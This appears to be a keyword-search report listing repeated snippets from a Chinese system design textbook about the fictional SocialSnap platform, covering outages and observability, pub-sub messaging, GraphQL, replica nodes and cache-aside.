  c17_b01.md: ...状态的系统。  这个区别在实践中很重要。监控告诉你有些东西出错了。可观测性告诉你为什么。  考虑 SocialSnap outage 后的两个场景。第一种，监控系统告诉你：“Redis 错误率超过 30%。”这是监控——预定义阈值被触发。第二种，你可以...
  c17_b07.md: ...糟糕的告警是生产运营中最常见、最有害的问题之一。告警疲劳——工程师被低质量告警淹没，开始忽略或静音——会导致真正的 outage 未被察觉。   #### 基于症状 vs 基于原因的告警  存在两种告警哲学，结果截然不同。  **基于原因的告警**...
  c17_b08.md: ...3 点为一个非紧急告警叫醒人，会侵蚀对告警系统的信任。信任被侵蚀后，工程师会开始静音告警“只想睡一觉”。最终抓住真正 outage 的告警可能和那些噪声一起被静音。  理想的 on-call 体验：每次 page 都是真实的用户可见问题，每次 pag...
  c17_b08.md: ...控基础设施本身也必须被监控。谁来监视监视者？）  但收益在几乎任何规模都超过成本。盲目飞行的团队——依赖用户报告来发现 outage——的 MTTR 和每次事故影响范围始终高于具备良好可观测性的团队。...
  c17_b09.md: ...### 17.5 SocialSnap v6 复盘  让我们回到第 16 章的周二 outage，用可观测性视角审视。具备合适可观测性基础设施的 SocialSnap v6 会经历同样的 Redis 降级——但响应将...
  c17_b09.md: ...复完整质量。用户总影响：数据在 shard 2 上的用户经历 4 分钟略陈旧的 feed。没有 503 错误。没有完整 outage。  未观测到的周二 outage（20 多分钟完全失败）与观测到的版本（4 分钟优雅降级）之间的差异不是架构差异——而...
  c17_b09.md: ...hard 2 上的用户经历 4 分钟略陈旧的 feed。没有 503 错误。没有完整 outage。  未观测到的周二 outage（20 多分钟完全失败）与观测到的版本（4 分钟优雅降级）之间的差异不是架构差异——而是认知差异。知道正在发生什么是响应...
  c17_b11.md: ...失败令人烦恼但不灾难；用户会重试。这支持 99.9% 而非 99.99%。(2) 业务影响——对免费社交平台，长时间 outage 影响参与度和声誉；短暂降级可接受。(3) 运营成本——维持 99.99% 需要更激进的告警和响应，降低开发速度。(4)...
  c17_b14.md: ...线索。形成假设，测试，抛弃或证实。好调查者不会随机搜索——他们从证据推理到原因。  SocialSnap v6 的周二 outage 通过可观测性视角复盘，展示了量化的差异：4 分钟优雅降级对 20 多分钟完全失败。不是不同架构——而是对系统正在做什么...
  c18_b01.md: ...、生产事故成本低时，这种工作流完全合理。  SocialSnap 有 300 万（3 million）用户。10 分钟 outage 影响 50 万（500,000）并发用户。一个让 5% 用户 feed 损坏的糟糕部署会产生数千张工单、可衡量的流失和...
  c18_b01.md: ...各自隔离正确的服务连接后以意外方式交互的组合行为  这不是单元测试的失败——单元测试正在做它承诺的事。问题是，导致生产 outage 的 bug 往往不是单个函数中的 bug。它们是**组件间交互**中的 bug：超时配置太长、重试在 outage 期...
  c18_b01.md: ...产 outage 的 bug 往往不是单个函数中的 bug。它们是**组件间交互**中的 bug：超时配置太长、重试在 outage 期间放大负载、缓存失效顺序错误、分布式事务让数据处于半提交状态。  这些 bug 需要不同的测试策略。...
  c18_b03.md: ...并对生产系统定期（每周或每月）进行，即使没做重大变更。基础设施会漂移；流量模式会变；依赖会变慢。定期负载测试在它们变成 outage 前发现它们。   ### 18.3 混沌工程——测试你无法预测的东西  负载测试验证高流量下的行为。但流量不是系统失败...
  c18_b05.md: ...——每个实验应有明确范围：“我们将终止一个 Post Service 实例，同时其他服务正常运行。”避免可能级联成完全 outage 的实验。 4. **准备停止按钮**——每个混沌实验都应能立即停止。实验期间应有人盯着监控，准备在看到比预期更糟时停止...
  c18_b13.md: ...vice 调用上设熔断器。Auth 宕机时熔断器打开，请求快速失败而不是堆积。这完全避免堆积，但意味着用户在 Auth outage 期间看到错误而非排队——这是值得做的权衡。 2. **请求超时并快速失败：** Feed Service 不应无限等待...
  c18_b13.md: ...Service 不应无限等待认证，而应将 Auth 调用超时设为例如 2 秒。这防止线程堆积，但意味着用户在 Auth outage 期间经历错误而不是排队。 3. **带指数退避和抖动的重试（第 15 章幂等性讨论）：** 如果 Feed Servi...
  c18_b14.md: ...团队先在 staging 实验，只把理解充分的失败模式 graduated 到生产。  综合：混沌工程不是“故意制造 outage”。做好时，它是“故意引入特定、有界、被监控的失败，以验证系统按设计处理它。”Netflix Chaos Monkey...

=== python (28 occurrences) ===
  c01_b01.md: ...的旅程：系统到底是什么？为什么规模改变一切？  ### 1.1 什么让某个东西成为系统？  从一个小例子开始。这是一个 Python 函数：  ```python def get_post(post_id):     return database.q...
  c01_b01.md: ...规模改变一切？  ### 1.1 什么让某个东西成为系统？  从一个小例子开始。这是一个 Python 函数：  ```python def get_post(post_id):     return database.query("SELECT *...
  c01_b02.md: ...SocialSnap**，一个从极小开始成长的社交平台。现在，在 v0 版本，它已经是系统能简单到的样子：  * 一个 Python/Flask 应用 * 一台运行在同一台机器上的 PostgreSQL 数据库 * 托管在一台笔记本电脑（或廉价 VPS...
  c01_b08.md: ...**答案：** SocialSnap v0 是本章引入的贯穿例子：一台机器上的 Python/Flask 应用，配 PostgreSQL 数据库，服务少量用户。它被称为“完全有效的系统”，是因为它在当前规模下完成...
  c05_b01.md: ...我们离开 SocialSnap v0 时，它还是笔记本电脑上的一个 Python 函数。这个函数返回博客帖子，数据住在……某个地方。也许是 Python 字典，也许是 JSON 文件。三个用户时怎么都...
  c05_b01.md: ...lSnap v0 时，它还是笔记本电脑上的一个 Python 函数。这个函数返回博客帖子，数据住在……某个地方。也许是 Python 字典，也许是 JSON 文件。三个用户时怎么都行。  现在我们需要给 SocialSnap 的数据一个真正的家。而有一...
  c11_b01.md: ...SocialSnap 从第 1 章笔记本上的一个 Python 函数走了很远。它现在拥有：  * 设计良好的 PostgreSQL 关系型数据库 schema（第 5 章） * 用于...
  c11_b01.md: ...，并取回相关用户信息。  在 SocialSnap v3（仍是单台服务器）中，会话存储就是应用服务器自己的内存——一个 Python 字典：       sessions = {         "sess_a7b3c9d2e4f1": {"user_...
  c11_b13.md: ...profile"         cached = local_cache.get(cache_key)  # 进程内 Python dict（TTL 300 秒）         if cached:             return cache...
  c11_b14.md: ...更新资料，失效需要到达哪些缓存？  **答案：** 问题：`local_cache` 是每个应用服务器实例本地的进程内 Python 字典。三台服务器部署中，每台服务器有自己的独立缓存。这违反无状态要求——每台服务器持有未与同伴共享的状态（缓存的资料数...
  c21_b10.md: ...ocialSnap 架构的完整演进，看每一章的决策如何累积成当前架构。  **v0（第 1 章）：** 笔记本上的单个 Python 函数。无数据库、无规模、无容错。整个系统状态在内存中。  **v1（第 5 章）：** 加入 PostgreSQL。用...
  c26_b13.md: ...一切的实际应用。  第 27 章后退一步：这一切是如何演进的？SocialSnap 的完整演进——从笔记本电脑上的一个 Python 函数（第 1 章）到第 26 章的分布式平台——就是真实系统如何构建的故事。...
  c27_b01.md: ...章展示它们如何到达这里。  为此，我们将回顾 SocialSnap 从最开始的完整旅程——第 1 章笔记本电脑上的一个 Python 函数——到第 26 章分布式基础设施的每一次架构拐点。重新审视 SocialSnap 团队做出的每个决策，并以后见之明...
  c27_b01.md: ...v0 —— 第 1 章：笔记本电脑上的一个函数（第 1–4 周）  **它是什么：** 开发者笔记本电脑上运行的一个 Python Flask 应用。单个端点。没有数据库——数据存在内存 Python 字典里。服务器重启后所有数据丢失。  **为什么...
  c27_b01.md: ...**它是什么：** 开发者笔记本电脑上运行的一个 Python Flask 应用。单个端点。没有数据库——数据存在内存 Python 字典里。服务器重启后所有数据丢失。  **为什么正确：** 创始人需要测试是否有人使用产品，而非产品能否扩展。此阶段正...
  c27_b10.md: ...责明确分离的 80 人团队，这次拆分可能值得。  **Q2.** SocialSnap 团队决定因性能原因把通知服务从 Python 重写成 Go。设计一个 strangler fig 迁移计划，让他们能在生产流量中验证新的 Go 服务，同时保持即时回...
  c27_b11.md: ...**答案：** 迁移计划：阶段 1（Shadow 模式，2 周）：部署 Go 服务与 Python 服务并行。通过镜像代理把所有通知事件同时路由到两个服务。Python 服务继续实际投递通知；Go 服务处理事件但抑制实...
  c27_b11.md: ...Shadow 模式，2 周）：部署 Go 服务与 Python 服务并行。通过镜像代理把所有通知事件同时路由到两个服务。Python 服务继续实际投递通知；Go 服务处理事件但抑制实际投递（只记录它会发送什么）。比较两个服务打算执行的动作：它们计算的通...
  c27_b11.md: ...门路由到 Go 服务（实际投递）。密切监控投递率、错误率和延迟。若错误率或投递失败上升，立即通过把 100% 流量切回 Python 服务来回滚（功能开关变更）。阶段 3（渐进推出，2 周）：把 Go 服务流量从 5% → 25% → 50% → 10...
  c27_b11.md: ...服务的投递率和错误率。阶段 4（下线 Python 服务，1 周）：Go 服务无事件地处理 100% 流量一周后，下线 Python 服务。保留其代码分支 30 天以备紧急回滚。回滚机制：配置服务中的单个功能开关控制流量路由。把开关从 “go” 改为...
  c27_b11.md: ...服务。保留其代码分支 30 天以备紧急回滚。回滚机制：配置服务中的单个功能开关控制流量路由。把开关从 “go” 改为 “python” 立即重定向所有流量。开关变更通过 gossip（第 26 章）在 10 秒内传播到所有路由节点。  **Q3.**...
  c27_b11.md: ...**答案：** 迁移计划：阶段 1（Shadow 模式，2 周）：部署 Go 服务与 Python 服务并行。通过镜像代理把所有通知事件同时路由到两个服务。Python 服务继续实际投递通知；Go 服务处理事件但抑制实...
  c27_b11.md: ...Shadow 模式，2 周）：部署 Go 服务与 Python 服务并行。通过镜像代理把所有通知事件同时路由到两个服务。Python 服务继续实际投递通知；Go 服务处理事件但抑制实际投递（只记录它会发送什么）。比较两个服务打算执行的动作：它们计算的通...
  c27_b11.md: ...门路由到 Go 服务（实际投递）。密切监控投递率、错误率和延迟。若错误率或投递失败上升，立即通过把 100% 流量切回 Python 服务来回滚（功能开关变更）。阶段 3（渐进推出，2 周）：把 Go 服务流量从 5% → 25% → 50% → 10...
  c27_b11.md: ...服务的投递率和错误率。阶段 4（下线 Python 服务，1 周）：Go 服务无事件地处理 100% 流量一周后，下线 Python 服务。保留其代码分支 30 天以备紧急回滚。回滚机制：配置服务中的单个功能开关控制流量路由。把开关从 “go” 改为...
  c27_b11.md: ...服务。保留其代码分支 30 天以备紧急回滚。回滚机制：配置服务中的单个功能开关控制流量路由。把开关从 “go” 改为 “python” 立即重定向所有流量。开关变更通过 gossip（第 26 章）在 10 秒内传播到所有路由节点。  **Q3.**...
  c28_b24.md: ...任何新模式的模型。  SocialSnap 的最后一章最具人文色彩：80 名工程师、8 个团队、一对仍记得笔记本电脑上 Python 函数的创始人。系统不是通过宏大设计，而是通过为每个观察到的具体问题积累具体解决方案而成长——每一次都是侦探收集线索、团...
  intro.md: ...一旦理解了约束，就会发现其实经过深思熟虑。  主线是 SocialSnap，一个虚构的社交平台。它从笔记本电脑上的一个 Python 函数开始，逐章演进为全球分布式服务：sharded databases（分片数据库）、circuit breakers...

=== sub (27 occurrences) ===
  c06_b03.md: ...户 X 这分钟已调用 47 次 API”）。  **实时数据：** 排行榜（Redis sorted set）、pub-sub 消息、实时在线状态（“谁现在在线”）。   #### 键值存储的 Tradeoffs（权衡）  **收益：** 微秒级...
  c08_b03.md: ...）。重复安全处理是消费者逻辑的属性（完全在你的控制之内）。后者几乎总是正确思考问题的方式。   ### 8.4 Pub-Sub——向多个消费者广播事件  生产者-消费者模型是一个生产者向一个消费者发送消息。但如果一个事件有多个相关方呢？  当 S...
  c08_b03.md: ...费者——你需要为每种消费者类型单独一个队列，注册代码要知道所有四个系统），要么需要更聪明的机制。  这就是 **pub-sub**（publish-subscribe，发布-订阅）。...
  c08_b03.md: ...）。重复安全处理是消费者逻辑的属性（完全在你的控制之内）。后者几乎总是正确思考问题的方式。   ### 8.4 Pub-Sub——向多个消费者广播事件  生产者-消费者模型是一个生产者向一个消费者发送消息。但如果一个事件有多个相关方呢？  当 S...
  c08_b03.md: ...费者——你需要为每种消费者类型单独一个队列，注册代码要知道所有四个系统），要么需要更聪明的机制。  这就是 **pub-sub**（publish-subscribe，发布-订阅）。...
  c08_b04.md: ...#### 定义：Pub-Sub（发布-订阅）  在 **pub-sub 模式** 中，生产者（**发布者，publishers**）把事件发布到命名的...
  c08_b04.md: ...#### 定义：Pub-Sub（发布-订阅）  在 **pub-sub 模式** 中，生产者（**发布者，publishers**）把事件发布到命名的**主题（topics）**（或频道）。...
  c08_b04.md: ...ibers**）订阅特定主题并接收发布到该主题的每条消息。一条发布的消息投递给所有订阅者。  plain 语言：pub-sub 像报纸。报纸（发布者）印一版。每个订阅者都得到该版副本。订阅者互不知晓；他们只知道报纸。  SocialSnap 注册...
  c08_b04.md: ...a——分布式日志  生产中有多种消息队列系统：RabbitMQ、Amazon SQS、Google Cloud Pub/Sub、Apache Kafka。其中 Kafka 值得特别对待，因为它的设计哲学与传统队列根本不同——也因为它塑造了行业对事...
  c08_b04.md: ...#### 定义：Pub-Sub（发布-订阅）  在 **pub-sub 模式** 中，生产者（**发布者，publishers**）把事件发布到命名的...
  c08_b04.md: ...#### 定义：Pub-Sub（发布-订阅）  在 **pub-sub 模式** 中，生产者（**发布者，publishers**）把事件发布到命名的**主题（topics）**（或频道）。...
  c08_b04.md: ...ibers**）订阅特定主题并接收发布到该主题的每条消息。一条发布的消息投递给所有订阅者。  plain 语言：pub-sub 像报纸。报纸（发布者）印一版。每个订阅者都得到该版副本。订阅者互不知晓；他们只知道报纸。  SocialSnap 注册...
  c08_b04.md: ...a——分布式日志  生产中有多种消息队列系统：RabbitMQ、Amazon SQS、Google Cloud Pub/Sub、Apache Kafka。其中 Kafka 值得特别对待，因为它的设计哲学与传统队列根本不同——也因为它塑造了行业对事...
  c08_b05.md: ...放。  对更简单的用例（单个消费者从队列读取），托管服务如 Amazon SQS 或 Google Cloud Pub/Sub 通常是正确选择。Kafka 在你需要高吞吐、多个独立消费者组或事件重放能力时才配得上它的复杂度。   ### 8.6...
  c08_b10.md: ...递实现。  结果：理想状态，但实践中通过仔细的幂等设计而非真正正好一次基础设施实现。  **Q3.** 什么是 pub-sub 模式？它与简单生产者-消费者队列有何不同？何时会选择 pub-sub 而非点对点队列？...
  c08_b10.md: ...基础设施实现。  **Q3.** 什么是 pub-sub 模式？它与简单生产者-消费者队列有何不同？何时会选择 pub-sub 而非点对点队列？...
  c08_b11.md: ...——这对并行化工作有用（多个 worker 处理同一队列的订单）。但每条消息只到一个 worker。  在 **pub-sub** 中，发布到主题的消息投递给所有订阅者。每个订阅者得到自己的副本。订阅者相互独立——新增订阅者不影响现有订阅者，发布...
  c08_b11.md: ...个订阅者得到自己的副本。订阅者相互独立——新增订阅者不影响现有订阅者，发布者也不需要知道谁在订阅。  **选择 pub-sub 当：** 一个事件有多个独立消费者感兴趣。SocialSnap 的注册事件对邮件服务、分析、联系人通知和 onboar...
  c08_b11.md: ...nboarding 都感兴趣。如果你用点对点队列，需要四个单独队列（每个消费者一个），注册服务要向四个队列发布。Pub-sub 把它合并：一个主题、四个订阅者、一次发布。  **选择点对点当：** 你想让多个 worker 处理同一队列以并行化工...
  c08_b11.md: ...化工作。十个邮件服务 worker 都读同一队列意味着十封邮件并行处理——每封邮件只由一个 worker 处理。Pub-sub 会给每个 worker 自己的订阅，十个 worker 都会发送每封邮件。  常见组合：在 fan-out 层用 pu...
  c08_b11.md: ...给每个 worker 自己的订阅，十个 worker 都会发送每封邮件。  常见组合：在 fan-out 层用 pub-sub（一个事件 → 多个消费者），在每个消费者类型内部用点对点（该类型的多个 worker 共享一个队列）。  **Q4.*...
  c08_b16.md: ...管队列的吞吐时，Kafka 才配得上它的复杂度。当你只需要简单的“后台执行这个任务”时，SQS 或 Cloud Pub/Sub 等托管队列是正确选择。...
  c08_b17.md: ...、正好一次——描述故障时消息会发生什么。至少一次是最常见的生产选择，与幂等消费者配对以安全处理重复投递。  **Pub-sub** 扩展该模式，向多个独立消费者广播事件。单个事件可在多个系统触发动作，发布者无需知道每个消费者。  **Kafka*...
  c11_b09.md: ...象存储。缓存 → Redis。后台作业状态 → 数据库或队列系统。WebSocket 连接状态 → Redis pub/sub 或 WebSocket 网关服务。  遵循无状态要求的应用服务器是纯计算节点：接收请求，从共享基础设施读取状态，计算结...
  c19_b03.md: ...WT"}`  **Payload**（claims——关于用户和 token 的断言）：       {       "sub": "user_8821934",       "name": "Alex Chen",       "iat": 1...
  c21_b09.md: ...就是 **扇出问题（fan-out problem）**——单次写入必须分发给大量读者。它最早出现在第 8 章 pub-sub 讨论中，现在显现为核心架构挑战。  对 DM 场景（2 名参与者），扇出微不足道。对小群（最多 100 名成员），投递...
  c28_b11.md: ...h 8) | 生产者延迟更高（异步投递） | 至少一次或精确一次（可配置） | 高——队列缓冲故障 | 中 **Pub-sub messaging** (Ch 8) | 更高（异步） | 最终（消费者按自己节奏处理） | 极高——故障域解耦 |...

=== graphql (27 occurrences) ===
  c09_b07.md: ...ebSocket 服务器需要仔细的会话管理（与第 11 章将探讨的有状态会话问题类似）。   ### 9.7 REST、GraphQL 与 gRPC——API 设计问题  当两个服务通信时，它们需要约定接口：有哪些操作、用什么数据格式、如何表达错误。这个...
  c09_b07.md: ...plication Programming Interface）**。  三种 API 风格主导现代系统设计：REST、GraphQL 和 gRPC。选择它们需要第 6 章侦探方法：从访问模式线索推理。...
  c09_b08.md: ...→ Alice's follower count   三个独立 HTTP 请求，每个都有一次网络往返。   #### GraphQL——以查询作为 API  GraphQL 由 Facebook 开发，2015 年公开发布，专门用于解决 REST 的过...
  c09_b08.md: ...count   三个独立 HTTP 请求，每个都有一次网络往返。   #### GraphQL——以查询作为 API  GraphQL 由 Facebook 开发，2015 年公开发布，专门用于解决 REST 的过度取回和取回不足问题。  在 Graph...
  c09_b08.md: ...aphQL 由 Facebook 开发，2015 年公开发布，专门用于解决 REST 的过度取回和取回不足问题。  在 GraphQL 中，客户端在查询中精确指定想要什么数据：       query {       user(id: 42) {...
  c09_b08.md: ...字段——不多不少——在一个 HTTP 请求内完成。服务器从数据所在之处（数据库、缓存、另一个服务）解析每个字段。  **GraphQL 的优点：**  * 消除过度取回和取回不足 * 所有查询和变更都走单一端点 * 自文档化（schema 描述所有可用类...
  c09_b08.md: ...ema 描述所有可用类型和操作） * 极适合复杂嵌套数据获取（社交图、内容层级） * 对带宽有限的移动客户端理想  **GraphQL 的缺点：**  * 服务器实现更复杂（需要 schema、每个字段的 resolver） * 缓存更难——因为查询是带...
  c09_b08.md: ...缓存必须在应用层做 * 过于灵活的查询可能成为安全问题（客户端可构造深嵌套查询，产生巨大数据库负载） * 给服务器增加 GraphQL 运行时层 * 对习惯 REST 的 API 消费者学习曲线更陡  **何时选 GraphQL：** 当许多不同客户端（...
  c09_b08.md: ...负载） * 给服务器增加 GraphQL 运行时层 * 对习惯 REST 的 API 消费者学习曲线更陡  **何时选 GraphQL：** 当许多不同客户端（Web、移动、第三方开发者）需要以不同形态获取相同底层数据时。例如 Facebook 的 ne...
  c09_b08.md: ...book 的 news feed 在 Web、Android、iOS 上渲染不同——但底层数据（帖子、用户、互动）相同。GraphQL 让每个客户端从单一 API 请求它需要的精确数据。...
  c09_b09.md: ...TP 工具友好。  **线索：许多不同客户端（Web、iOS、Android、智能电视）需要相同数据的不同形态** → GraphQL。它消除了“为每个客户端建不同端点”的问题。  **线索：内部服务间高频调用** → gRPC。性能和强类型值得设置成本...
  c09_b09.md: ...* → gRPC。性能和强类型值得设置成本。  **线索：简单 CRUD 操作，API 表面小且稳定** → REST。GraphQL 的复杂度不合理。  **线索：实时双向通信** → WebSocket（标准 REST、GraphQL、gRPC 形式...
  c09_b09.md: ...→ REST。GraphQL 的复杂度不合理。  **线索：实时双向通信** → WebSocket（标准 REST、GraphQL、gRPC 形式都不是，尽管 gRPC 流是一个选项）。  大多数生产系统使用多种：REST 供公共消费者，gRPC 供...
  c09_b11.md: ...降低（消息小 3-10 倍、解析更快） | ↔ | ↔ | ↑（Protobuf schema 管理、工具）   用 GraphQL 替代 REST | ↑ 轻微（resolver 开销） | ↔ | ↔ | ↑（schema 设计、查询复杂度管理）...
  c09_b14.md: ...#### 应用问题  **Q1.** SocialSnap 考虑把移动 API 从 REST 换成 GraphQL。移动应用现在渲染 home feed 需要 4 个 REST 调用：`GET /users/{id}`、`GET /f...
  c09_b14.md: .../following_count`、`GET /notifications/count`。用 9.7 节的决策框架分析 GraphQL 是否是正确选择。它会带来什么收益，需要接受什么成本？  提示  想想移动应用目前需要多少次往返。然后想想 GraphQ...
  c09_b14.md: ...raphQL 是否是正确选择。它会带来什么收益，需要接受什么成本？  提示  想想移动应用目前需要多少次往返。然后想想 GraphQL 的单一端点模型会改变什么。REST 和 GraphQL 的缓存分别是什么样的？服务器端实现成本如何？  **答案：**...
  c09_b14.md: ...什么成本？  提示  想想移动应用目前需要多少次往返。然后想想 GraphQL 的单一端点模型会改变什么。REST 和 GraphQL 的缓存分别是什么样的？服务器端实现成本如何？  **答案：**  **应用侦探框架：**  **支持 GraphQL...
  c09_b14.md: ...GraphQL 的缓存分别是什么样的？服务器端实现成本如何？  **答案：**  **应用侦探框架：**  **支持 GraphQL 的线索：**  移动应用渲染一个屏幕需要 4 个独立 REST 调用。每次调用在移动网络上都是一次独立往返（每个约 5...
  c09_b14.md: ...00ms）。串行请求时 home feed 可渲染前的总时间：200-400ms；即使并行也需要约 100-150ms。GraphQL 会把这 4 个调用合并成一个查询：       query HomeFeed {       me {...
  c09_b14.md: ...}     }   一个请求、一次往返、只取需要的字段。移动带宽因消除过度取回字段和额外请求开销而节省。  **反对 GraphQL 的线索（或需要小心处理）：**  缓存：REST 的 `GET /feed` 可在 CDN 或浏览器层缓存（HTTP...
  c09_b14.md: ...或需要小心处理）：**  缓存：REST 的 `GET /feed` 可在 CDN 或浏览器层缓存（HTTP 层缓存）。GraphQL 查询是带自定义 query body 的 POST 请求，HTTP 缓存不适用。缓存必须在应用层处理——要么在 Gra...
  c09_b14.md: ...hQL 查询是带自定义 query body 的 POST 请求，HTTP 缓存不适用。缓存必须在应用层处理——要么在 GraphQL 客户端（如 Apollo Client 的规范化缓存），要么在服务器 resolver 层（用 Redis，见第 7...
  c09_b14.md: ...么在服务器 resolver 层（用 Redis，见第 7 章）。  服务器端复杂度：REST 端点是简单的数据库查询。GraphQL 服务器需要 schema 定义、每个字段的 resolver，以及防止深嵌套查询（查询深度限制、复杂度限制）的保护，避...
  c09_b14.md: ...resolver，以及防止深嵌套查询（查询深度限制、复杂度限制）的保护，避免产生巨大数据库负载。  **推荐：**  GraphQL 对移动 API 是正确选择，但有两个条件：  1. 实现查询深度和复杂度限制，防止滥用查询。 2. 为 feed re...
  c09_b19.md: ...为实时应用实现全双工服务器推送，代价是有状态的连接，使水平扩展复杂化（第 11 章直接处理这个问题）。  **REST、GraphQL 和 gRPC** 是三种各有 tradeoff（权衡）的 API 风格。REST 通用、可缓存。GraphQL 消除过...
  c09_b19.md: ...EST、GraphQL 和 gRPC** 是三种各有 tradeoff（权衡）的 API 风格。REST 通用、可缓存。GraphQL 消除过度取回和取回不足。gRPC 是服务间通信的最高性能选择。访问模式线索指导选择。  **API 网关** 在系统边...

=== node (25 occurrences) ===
  c06_b05.md: ...，关系）。每条边直接指向它连接的节点。从 Alice 到她的朋友就是跟随指针——而不是表扫描或 join。       Node: Alice (id: 1)       → FRIENDS_WITH → Node: Bob (id: 2)...
  c06_b05.md: ...表扫描或 join。       Node: Alice (id: 1)       → FRIENDS_WITH → Node: Bob (id: 2)       → FRIENDS_WITH → Node: Carol (id: 3)...
  c06_b05.md: ...→ FRIENDS_WITH → Node: Bob (id: 2)       → FRIENDS_WITH → Node: Carol (id: 3)       → FRIENDS_WITH → Node: Dave (id: 4)...
  c06_b05.md: ...→ FRIENDS_WITH → Node: Carol (id: 3)       → FRIENDS_WITH → Node: Dave (id: 4)      Node: Bob (id: 2)       → FRIENDS_WITH →...
  c06_b05.md: ...arol (id: 3)       → FRIENDS_WITH → Node: Dave (id: 4)      Node: Bob (id: 2)       → FRIENDS_WITH → Node: Eve (id: 5)...
  c06_b05.md: ...Dave (id: 4)      Node: Bob (id: 2)       → FRIENDS_WITH → Node: Eve (id: 5)       → FRIENDS_WITH → Node: Alice (id: 1)   找...
  c06_b05.md: ...→ FRIENDS_WITH → Node: Eve (id: 5)       → FRIENDS_WITH → Node: Alice (id: 1)   找 Alice 的朋友：跟随 Alice 节点的所有 `FRIENDS_WITH`...
  c14_b01.md: ...—两个副本，两个真相  从最简单版本开始。  你有一个数据库，里面一条记录：计数器初始为 0。你把数据库复制到两个节点：Node A 和 Node B。两个节点初始计数器都是 0。  现在两个事件同时发生：  * 服务器 1 向 Node A 发送...
  c14_b01.md: ...相  从最简单版本开始。  你有一个数据库，里面一条记录：计数器初始为 0。你把数据库复制到两个节点：Node A 和 Node B。两个节点初始计数器都是 0。  现在两个事件同时发生：  * 服务器 1 向 Node A 发送“递增计数器”的写...
  c14_b01.md: ...两个节点：Node A 和 Node B。两个节点初始计数器都是 0。  现在两个事件同时发生：  * 服务器 1 向 Node A 发送“递增计数器”的写操作。 * 服务器 2 从 Node B 读取计数器。  Node A 收到写并把计数器更新...
  c14_b01.md: ...0。  现在两个事件同时发生：  * 服务器 1 向 Node A 发送“递增计数器”的写操作。 * 服务器 2 从 Node B 读取计数器。  Node A 收到写并把计数器更新为 1。但 Node B 还没收到这个更新——复制是异步的。服务...
  c14_b01.md: ...：  * 服务器 1 向 Node A 发送“递增计数器”的写操作。 * 服务器 2 从 Node B 读取计数器。  Node A 收到写并把计数器更新为 1。但 Node B 还没收到这个更新——复制是异步的。服务器 2 从 Node B 读到...
  c14_b01.md: ...递增计数器”的写操作。 * 服务器 2 从 Node B 读取计数器。  Node A 收到写并把计数器更新为 1。但 Node B 还没收到这个更新——复制是异步的。服务器 2 从 Node B 读到 0。  服务器 2 该如何理解？它读到 0。...
  c14_b01.md: ...数器。  Node A 收到写并把计数器更新为 1。但 Node B 还没收到这个更新——复制是异步的。服务器 2 从 Node B 读到 0。  服务器 2 该如何理解？它读到 0。这是真正的当前值吗？还是真正当前值已经是 1，只是 Node B...
  c14_b01.md: ...从 Node B 读到 0。  服务器 2 该如何理解？它读到 0。这是真正的当前值吗？还是真正当前值已经是 1，只是 Node B 落后了？  答案取决于你的**一致性模型（consistency model）**——系统对读操作相对于已完成写操...
  c14_b05.md: ...d Hinted Handoff）  即使使用 quorum 写，最终一致性系统也必须处理写期间节点故障。如果写到达时 Node B 宕机怎么办？写在 Node A 和 C 上达到 quorum（2 个中的 2 个——quorum 满足），客户端收...
  c14_b05.md: ...）  即使使用 quorum 写，最终一致性系统也必须处理写期间节点故障。如果写到达时 Node B 宕机怎么办？写在 Node A 和 C 上达到 quorum（2 个中的 2 个——quorum 满足），客户端收到确认。但 Node B 错过了...
  c14_b05.md: ...么办？写在 Node A 和 C 上达到 quorum（2 个中的 2 个——quorum 满足），客户端收到确认。但 Node B 错过了这次写。  Node B 恢复后，它的数据是陈旧的。两种机制处理这种情况：...
  c14_b05.md: ...上达到 quorum（2 个中的 2 个——quorum 满足），客户端收到确认。但 Node B 错过了这次写。  Node B 恢复后，它的数据是陈旧的。两种机制处理这种情况：...
  c14_b06.md: ...#### 提示移交（Hinted Handoff）  Node B 不可达期间，Node A 或 C 会接收原本给 Node B 的写，并带一个“提示”——一条说明“这条写是给 No...
  c14_b06.md: ...#### 提示移交（Hinted Handoff）  Node B 不可达期间，Node A 或 C 会接收原本给 Node B 的写，并带一个“提示”——一条说明“这条写是给 Node B 的”。Node...
  c14_b06.md: ...#### 提示移交（Hinted Handoff）  Node B 不可达期间，Node A 或 C 会接收原本给 Node B 的写，并带一个“提示”——一条说明“这条写是给 Node B 的”。Node B 重新上线后，提示节点把队列中的写...
  c14_b06.md: ...de B 不可达期间，Node A 或 C 会接收原本给 Node B 的写，并带一个“提示”——一条说明“这条写是给 Node B 的”。Node B 重新上线后，提示节点把队列中的写投递过去。Node B 重放这些写并追上来。  提示移交在节点...
  c14_b06.md: ...，Node A 或 C 会接收原本给 Node B 的写，并带一个“提示”——一条说明“这条写是给 Node B 的”。Node B 重新上线后，提示节点把队列中的写投递过去。Node B 重放这些写并追上来。  提示移交在节点临时不可用（网络抖动...
  c14_b06.md: ...，并带一个“提示”——一条说明“这条写是给 Node B 的”。Node B 重新上线后，提示节点把队列中的写投递过去。Node B 重放这些写并追上来。  提示移交在节点临时不可用（网络抖动、短暂重启）时有效。对长期不可用无效——提示只保留有限时...

=== aside (25 occurrences) ===
  c07_b03.md: ...过单服务器的应用——分布式缓存是正确选择。这是 SocialSnap v2 要走的路。   ### 7.3 Cache-Aside——最常见的模式  应用如何与缓存实际交互？有几种模式，各有不同 tradeoff（权衡）。最常见的是 **cache-...
  c07_b03.md: ...——最常见的模式  应用如何与缓存实际交互？有几种模式，各有不同 tradeoff（权衡）。最常见的是 **cache-aside**（也叫 **lazy loading**，懒加载）。  在 cache-aside 模式中，应用代码负责管理缓存。缓...
  c07_b03.md: ...衡）。最常见的是 **cache-aside**（也叫 **lazy loading**，懒加载）。  在 cache-aside 模式中，应用代码负责管理缓存。缓存本身“在旁边”——它不会自动接收写入或使条目失效。应用显式检查缓存、处理未命中、更新...
  c07_b03.md: ...过单服务器的应用——分布式缓存是正确选择。这是 SocialSnap v2 要走的路。   ### 7.3 Cache-Aside——最常见的模式  应用如何与缓存实际交互？有几种模式，各有不同 tradeoff（权衡）。最常见的是 **cache-...
  c07_b03.md: ...——最常见的模式  应用如何与缓存实际交互？有几种模式，各有不同 tradeoff（权衡）。最常见的是 **cache-aside**（也叫 **lazy loading**，懒加载）。  在 cache-aside 模式中，应用代码负责管理缓存。缓...
  c07_b03.md: ...衡）。最常见的是 **cache-aside**（也叫 **lazy loading**，懒加载）。  在 cache-aside 模式中，应用代码负责管理缓存。缓存本身“在旁边”——它不会自动接收写入或使条目失效。应用显式检查缓存、处理未命中、更新...
